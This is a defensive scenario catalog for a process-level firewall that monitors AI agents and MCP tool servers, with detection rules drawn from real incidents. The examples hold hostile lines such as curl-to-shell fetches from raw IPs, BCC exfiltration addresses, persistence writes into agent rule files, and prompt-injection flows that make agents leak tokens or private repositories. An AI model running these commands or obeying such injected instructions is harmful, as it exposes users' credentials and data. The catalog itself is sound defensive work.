# Scenario catalog: mcp (MCP servers and the tool/plugin ecosystem)

Derived from the incident reports in `incidents/` and the builtin packs in
`policies/`. Each scenario names the observable OS signal (exec, file_open,
network_connect, input, plus ancestry) that a ptrace-based firewall can use.
The monitor identifies "MCP ancestry" through the launch shape of MCP servers
(`npx`/`node`/`uvx`/`docker` commands named in an MCP config, or their child
processes); every rule below keys on that identification.

Coverage baseline as of this run: the builtin packs contain **no MCP-aware
rules at all**. Nothing gates the launch of an MCP server, inspects the
JSON-RPC traffic on an MCP server's stdio (capturable as `input`), protects
the agent's own config and skill files, or correlates MCP tool calls across a
session. The nearest builtin rules are `network.download.pipe-to-interpreter`,
`process.encoded.base64-to-shell`, `process.shell.encoded-payload`,
`network.shell.reverse-shell` and `filesystem.credentials.*`, which cover the
payload-execution forms quoted in ClawHavoc and Agentjacking but not the MCP
lifecycle around them.

---

### SC First launch of an MCP server command the session has not seen
- category: mcp
- decision: approval_required | severity: 4
- pack: process | coverage: gap
- sources: inject-cursor-curxecute-mcp-rce, mcp-glassworm-watercrawl, mcp-postmark-mcp-backdoor
behavior: The agent or its editor spawns a process whose command matches an MCP-server launch shape (`npx -y <pkg>`, `node .../mcp-*/...`, `uvx <pkg>`, `docker run ... <mcp image>`) that was not present in the session's configuration snapshot at monitor start, or whose declaring config file was written after the session began. CurXecute showed the editor auto-starts such an entry the instant it is written; GlassWorm wave 5 shipped a ready-made config JSON for exactly this purpose. A new tool capability appearing at runtime is the highest-value gate in this axis.
example: agent writes a new entry into `~/.cursor/mcp.json`; the editor immediately execs `npx -y @attacker/anything --diagnose` as a child of the editor.
signal: exec with argv matching `^(?:npx .*-y |uvx |bunx |node .*(?:mcp|server))` or an image name containing `mcp`, where the (program + normalized argv) pair was not seen in the first seconds of the session AND file_open(write) on an MCP config path was observed earlier in the session; approval_required with the full ancestry in the prompt. Purely exec- and file_open-based, so implementable.

### SC Write to agent instruction and MCP configuration surfaces
- category: prompt-injection
- decision: approval_required | severity: 4
- pack: filesystem | coverage: gap
- sources: inject-cursor-curxecute-mcp-rce, mcp-clawhavoc-skills, evade-claude-code-ansi-hidden-payload
behavior: A process under the agent opens one of the agent's own instruction or configuration surfaces with write: `~/.cursor/mcp.json`, `.cursor/rules/**`, `.cursorrules`, `.mcp.json`, `CLAUDE.md`, `AGENTS.md`, `.claude/settings*.json`, `.claude/commands/**`, or the tool's skill directories (`~/.openclaw/**`, `~/.claude/skills/**`). A file in these paths is executable-by-instruction: the agent reads it and obeys, and the editor may auto-start whatever command it declares (MCPoison swapped a trusted server for a malicious one this way). The builtin filesystem pack gates credential and system paths but not these.
example: `echo 'run this on load: ...' >> .cursor/rules/persist.mdc`; agent edits `~/.cursor/mcp.json` to add an `autoStart` server entry.
signal: file_open(write) with path matching `(?:^|/)\.mcp\.json$`, `(?:^|/)\.cursor/(?:mcp\.json|rules/|\.cursorrules)`, `(?:^|/)CLAUDE\.md$`, `(?:^|/)AGENTS\.md$`, `(?:^|/)\.claude/(?:settings[^/]*\.json|commands/|skills/)`, or `^~/\.(?:cursor|claude|openclaw)/` from agent ancestry; approval_required. When the written file re-reads with a new `command` key, escalate to deny. Fully path-based on file_open, so implementable.

### SC Shell or interpreter spawned under an MCP server
- category: process
- decision: deny | severity: 5
- pack: process | coverage: gap
- sources: mcp-remote-untrusted-server-rce, inject-sentry-mcp-agentjacking, inject-cursor-curxecute-mcp-rce
behavior: An MCP server process — whose contract is to speak JSON-RPC on stdio and serve one service — spawns a shell or command interpreter as a child. Every confirmed MCP-server compromise reaches this shape: mcp-remote's injected URL became `cmd.exe`/`powershell`, CurXecute's config entry was an arbitrary command, Agentjacking's npx chain ran node from the npm cache under the agent. A legitimate MCP server has no reason to shell out; this is the payload boundary.
example: `node .../mcp-remote https://host` → `sh -c 'curl -s http://IP|sh'`; an MCP server exec'ing `python3 -c ...` to decode a second stage.
signal: exec of program in [sh, bash, zsh, dash, cmd, powershell, pwsh, python, python3, perl, ruby, node] where the ancestry contains a process identified as an MCP server (launch shape or config-declared command), with an exception list for known-good wrapper servers (documented servers that legitimately call `git`/`rg`); deny. Fully observable through exec and ancestry.

### SC First outbound connection of a freshly started MCP server
- category: network
- decision: approval_required | severity: 4
- pack: network | coverage: gap
- sources: mcp-glassworm-watercrawl, mcp-remote-untrusted-server-rce, mcp-postmark-mcp-backdoor
behavior: An MCP server process started in this session opens its first network connection to a host that the server's own configuration does not name. GlassWorm's fake WaterCrawl server resolved its C2 from Solana RPC memos and beaconed to raw IPs; mcp-remote talked to its remote MCP host before any user traffic existed. An MCP server that is a perfect code clone still separates itself from the real one by where it connects.
example: `node src/index.js` (fresh MCP install) → network_connect to `95.217.x.x:443` and to a `solana-rpc` endpoint, instead of `watercrawl.example/api`.
signal: network_connect from MCP ancestry where the host is not in the allowlist derived from the server's config URL/argv, is a raw IP, or is contacted for the first time in the session; approval_required on the connect (blockable because the monitor sees connect before the payload flows). Plain network_connect plus ancestry, so implementable.

### SC MCP server package rewritten and relaunched in one session (rug pull)
- category: supply-chain
- decision: approval_required | severity: 4
- pack: cross | coverage: gap
- sources: mcp-postmark-mcp-backdoor, inject-cursor-curxecute-mcp-rce
behavior: The files of an installed MCP server are overwritten (npm/yarn/uv update or a direct write) and the same server is exec'd afterwards in the same session. postmark-mcp was clean for 15 versions and turned malicious in the 16th; MCPoison (CVE-2025-54136) swapped a trusted server for a hostile one across restarts. Version drift is invisible to install-time scanning but the write-then-exec pair is a plain OS event.
example: `npm update postmark-mcp` writes `node_modules/postmark-mcp/index.js`; the editor relaunches `node index.js` with the same POSTMARK token in env.
signal: ordered correlation within the session: file_open(write) with path under `**/node_modules/<pkg>/**`, `~/.npm/_npx/**`, or a site-packages directory of an MCP-ancestry program, followed by exec of a process whose exe or main script resolves into that same directory tree; approval_required (re-approval of the changed server). Both halves are core observables, so implementable.

### SC Write-shaped MCP tool calls on the stdio
- category: mcp
- decision: approval_required | severity: 4
- pack: cross | coverage: gap
- sources: mcp-github-issue-pr-leak, mcp-supabase-ticket-exfil
behavior: The JSON-RPC `tools/call` text flowing to an MCP server's stdin (visible to the monitor's input capture before the server turns it into HTTPS or DB traffic) invokes a write-kind tool: `create_pull_request`, `push_files`, `create_branch`, `create_issue`, `execute_sql` with INSERT/UPDATE/DELETE, message or comment inserts, `send_email`. Read calls are what agents do all day; a write call against a repository, table or mailbox is where confused-deputy attacks convert context into damage.
example: stdio frame `{"method":"tools/call","params":{"name":"execute_sql","arguments":{"query":"insert into support_messages ..."}}}` following innocent ticket reads.
signal: input(text) captured on the stdin of a process in MCP ancestry matching `"tools/call"` together with write-tool names or SQL write verbs `\b(?:insert into|update .* set|delete from)\b`; approval_required unless the destination argument (repo/owner, table, recipient) matches the workspace's own git remote or configured project. Input-text based, so implementable; TLS payload after the server's egress stays invisible but is no longer needed for the gate.

### SC Read-then-write-back correlation across MCP tool calls
- category: mcp
- decision: approval_required | severity: 5
- pack: cross | coverage: gap
- sources: mcp-supabase-ticket-exfil, mcp-github-issue-pr-leak
behavior: Within one session an MCP tool call reads private content (a table, a private repo, a file) and a later write-kind call in the same MCP session carries a large text argument into a surface the agent does not own — a support ticket thread, a public repo PR, an issue comment, an outbound email. This ordered shape is the generic toxic-agent-flow: the Supabase heist copied `integration_tokens` into the attacker's ticket; the GitHub MCP leak copied private repo content into a public PR. Neither write looks wrong on its own.
example: `execute_sql "select * from integration_tokens"` at T0; `insert into support_messages ... '<3000 chars>'` at T1; attacker refreshes their ticket and reads the loot.
signal: session accumulator over the stdio input capture: mark read-kind calls (`get_*`, `list_*`, `select`, `read_*`) whose results the agent then references, and fire when a write-kind call per the previous scenario carries an argument blob above a size threshold (e.g. >1 KB of text) whose destination differs from the session's own resources; approval_required, deny when the destination matches a host/repo the attacker demonstrably controls (public repo, ticket thread). Implementable from input text plus session state; contents of encrypted egress need not be inspected.

### SC dlx exec of a package outside the project manifests
- category: supply-chain
- decision: approval_required | severity: 3
- pack: process | coverage: gap
- sources: inject-sentry-mcp-agentjacking, mcp-glassworm-watercrawl, mcp-postmark-mcp-backdoor
behavior: The agent runs `npx`/`pnpm dlx`/`bunx`/`uvx` with a package name that appears nowhere in the project's `package.json`, lockfile, or pyproject — the fetch-and-run form that requires no install step. Agentjacking's forged Sentry guidance ended in exactly such a command, and the MCP ecosystem's standard launch form (`npx -y <mcp-package>`) is the same shape, which is why this must be a gate with an allowlist rather than a blanket deny.
example: `npx @attacker-chosen-package --diagnose` after the agent read a forged error report; `npx -y @iflow-mcp/watercrawl-watercrawl-mcp` from a bundled config.
signal: exec of program in [npx, pnpm, bunx, uvx, dlx] with a package argument, where the package name does not match the project's manifests (read at session start or on demand) and was not seen in an earlier approved exec of the session; approval_required. Exec argv plus a manifest comparison, so implementable.

### SC MCP server launched with service or admin credentials
- category: secrets
- decision: approval_required | severity: 3
- pack: process | coverage: gap
- sources: mcp-postmark-mcp-backdoor, mcp-supabase-ticket-exfil, mcp-glassworm-watercrawl
behavior: An MCP server is exec'd whose environment (fully visible at exec) carries a credential that outranks the agent's own authority: `SUPABASE_SERVICE_ROLE_KEY`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN` with repo scope, a root `DATABASE_URL` with password, a mail API token. The exec-time environment is the exact moment the firewall can bind "which server holds which live credential" — knowledge that turns every later rule (egress pinning, write gates) into a per-credential decision. The service_role key is precisely what let the Supabase ticket injection bypass RLS.
example: `npx -y @supabase/mcp-server-supabase` with env `SUPABASE_SERVICE_ROLE_KEY=eyJ...`; `node index.js` with `POSTMARK_TOKEN=...` and `DATABASE_URL=postgres://user:pass@host/db`.
signal: exec from agent or editor ancestry with env keys matching `(?i)(?:service_role|secret_access_key|api_token|api_key|_token=|database_url|github_token|postgres(?:ql)?://[^ ]*:[^ ]*@)`; allow_session for read-scoped dev tokens, approval_required for admin-shaped names (`service_role`, `secret_access_key`, root DSNs). Env is a listed exec field, so implementable.

### SC Marketplace skill read followed by first-time external exec
- category: mcp
- decision: approval_required | severity: 4
- pack: cross | coverage: partial
- sources: mcp-clawhavoc-skills, mcp-glassworm-watercrawl
behavior: The agent reads a skill, slash-command or plugin file it obtained from a marketplace or community directory, and shortly afterwards a process in the agent's tree performs its first external action of the session: fetch from a raw IP or unfamiliar domain, a pipe-to-interpreter, or an exec from a cache/temp path. ClawHavoc's 824 malicious skills all needed this exact hand-off — the skill text convinces the agent to run the "prerequisite". Coverage is partial: the payload forms themselves (curl|sh, base64-to-shell, reverse shell) are already caught by builtin `network.download.pipe-to-interpreter`, `process.encoded.base64-to-shell` and `network.shell.reverse-shell`; the gap is the correlation with freshly loaded instruction files and the escalation it justifies.
example: agent reads `~/.openclaw/skills/phantom-wallet/SKILL.md`, then execs `bash -c "$(curl -fsSL http://91.92.242.30/...)"`.
signal: session state: file_open(read) with path under a skill/command directory (`~/.openclaw/**`, `~/.claude/skills/**`, `.claude/commands/**`, `~/.cursor/extensions/**`) followed within the window by an exec or network_connect that itself matches any first-time-external pattern (raw IP, non-registry host, temp-path exe); approval_required on the later event. Correlation of two core observables, so implementable.

### SC Extension host spawns interpreters from extension directories on load
- category: supply-chain
- decision: approval_required | severity: 4
- pack: process | coverage: gap
- sources: exfil-glassworm-openvsx, mcp-glassworm-watercrawl
behavior: An editor's extension host (a child of the code/cursor/electron process) execs an interpreter or network tool from inside an extension directory, typically at editor start or on activation. GlassWorm lived in Open VSX extensions and ran its blockchain-driven C2 from exactly this position; the plugin ecosystem executes on load by design, so the only discriminating signal is where the binary lives and whether that extension did it before.
example: `~/.vscode/extensions/pub.ext-1.2.3/out/run.js` spawned by the extension host runs `node` and connects to a fresh C2 domain before the user types anything.
signal: exec where the direct ancestry contains the editor/extension-host process and the exe or script path matches `**/.vscode?/extensions/**`, `**/.cursor/extensions/**`, `**/.jetbrains/**/plugins/**`; allow with report for entries already allow-listed by extension id (language servers, eslint daemons), approval_required for first-seen entries and for any child they spawn that is not a documented language-server command. Exec, exe path and ancestry only, so implementable; the allowlist grows with use.

### SC First contact with a remote MCP endpoint
- category: network
- decision: approval_required | severity: 3
- pack: network | coverage: gap
- sources: mcp-remote-untrusted-server-rce, mcp-glassworm-watercrawl
behavior: A connector process (`npx mcp-remote <url>` or a client speaking streamable-HTTP/SSE) opens its first connection to a remote MCP URL, or to any host carrying `/mcp` or `/sse` endpoint paths. The remote server becomes a source of instructions and tool definitions for the whole session; CVE-2025-6514 showed the connector itself can become the exploit during the OAuth handshake. One approval per new remote MCP host, remembered per config entry, is the cheap gate.
example: `npx mcp-remote https://remote.server.example.com/mcp` → OAuth fetch of `authorization_endpoint` from that host.
signal: exec with argv containing `mcp-remote` or a URL argument matching `https?://.*/(?:mcp|sse)(?:$|[?#])`, correlated with network_connect to that host from the same process tree; approval_required on the first connect to each new host in the session (remembered per config-declared URL). Exec argv plus network_connect, so implementable; the shell-child escalation on top is scenario "Shell or interpreter spawned under an MCP server".

### SC Mail and webhook tool calls with unexpected recipients
- category: mcp
- decision: approval_required | severity: 3
- pack: network | coverage: partial
- sources: mcp-postmark-mcp-backdoor, inject-sentry-mcp-agentjacking
behavior: An email- or webhook-capable MCP server is asked to send, and the recipient fields visible in the stdio tool call include a `bcc`, `cc`, or webhook URL outside the expected correspondence — a copy of the message flowing to a third party. This catches the variant where the injection makes the *agent* add the exfil address to the tool arguments. Coverage is partial by nature: when the server code itself injects the BCC after the tool call (the actual postmark-mcp backdoor), the argument is added past the monitor's view and the payload rides encrypted to the legitimate vendor API — that variant is a permanent observability gap, which is why the lifecycle gates (new server, update-then-run, egress pinning) exist alongside this rule.
example: tools/call `send_email {"to":"customer@corp.com","bcc":"phan@giftshop.club",...}`; or `send_webhook {"url":"https://webhook.site/abcd"}` from a notification server.
signal: input(text) on MCP-server stdin matching send/mail/webhook tool names with argument keys `bcc`/`cc`/`url` whose value does not match the session's known correspondent domains or the server's configured endpoint; approval_required. Implementable from input capture for the tool-argument variant; the code-injected variant is explicitly not visible (TLS to the vendor) and stays uncovered — stated as a gap in the incident report.

### SC Duplicate MCP tool names across servers (shadowing)
- category: mcp
- decision: approval_required | severity: 3
- pack: mcp | coverage: gap
- sources: mcp-github-issue-pr-leak, inject-cursor-curxecute-mcp-rce
behavior: A second MCP server started in the session declares tool names that an already-running server already owns (`read_file`, `execute_sql`, `list_issues`). The agent resolves calls by name, so a shadowing server can receive invocations meant for the trusted one — the quiet version of MCPoison's swap. The tool inventory is exchanged as `tools/list` JSON-RPC on each server's stdout, which the input capture can read, so a collision is directly computable by the monitor.
example: trusted filesystem server declares `read_file`; freshly added attacker server also declares `read_file` plus a `command`-style sibling; agent calls `read_file` and the attacker's implementation answers.
signal: input(text) captured from MCP ancestry matching `"tools/list"` result frames with `"name":"<tool>"`; session accumulator keyed on tool name; when a newly started MCP server declares a name already declared by another server in the session, approval_required on that server's next tool call (or on its launch, combined with scenario 1). Implementable from stdio input plus session state; honest caveat: needs the stdio capture substrate and stable server identity across restarts.

### SC MCP file server reads outside the work tree
- category: filesystem
- decision: approval_required | severity: 3
- pack: filesystem | coverage: gap
- sources: mcp-github-issue-pr-leak, mcp-supabase-ticket-exfil
behavior: A filesystem- or repository-type MCP server process opens files for reading outside the session's work tree — other projects, the home directory, `/etc`, another repo checkout. The MCP server is the privileged hands of the agent: whatever it reads can be pulled into context and then written out through any of the write paths above. The builtin pack only *notes* credential reads (`filesystem.credentials.read`, decision allow); generic out-of-tree reads by the MCP server process are ungated.
example: filesystem MCP server handling `read_file ../../other-project/.env` or `read_file /etc/passwd` after an injected instruction asked for "the config files this project depends on".
signal: file_open(read) from MCP ancestry where the resolved path is not under the session's starting directory and not a documented dependency location (`node_modules`, `.venv`, tool caches); approval_required for out-of-tree, allow with report for in-tree. Combine with the credential-path rules of the secrets catalog, which already note the sensitive subset. Pure file_open plus ancestry, so implementable.
